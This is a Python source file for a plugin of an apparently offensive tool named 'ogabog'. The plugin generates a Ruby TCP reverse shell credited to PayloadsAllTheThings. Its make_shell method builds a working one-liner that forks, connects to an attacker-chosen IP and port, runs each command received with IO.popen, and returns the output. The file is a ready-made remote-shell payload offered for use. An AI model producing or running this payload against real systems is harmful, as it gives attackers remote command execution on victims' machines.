from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        # self.add_args(
        #     "--shell",
        #     default="bash",
        #     choices=const.LINUX_SHELL,
        #     help="Select shell type on target machine"
        # )
        # self.add_args(
        #     "--exec",
        #     default="iopopen",
        #     choices=[
        #         ""
        #     ],
        #     help="Select shell type on target machine"
        # )
        self.opts.description = "[ReverseShell][TCP] Ruby from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
    def make_shell(self):
        self.shell = """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{}","{}");while(cmd=c.gets);IO.popen(cmd,"r")""".format(self.args.ip, self.args.port)
        self.shell += """{|io|c.print io.read}end'"""
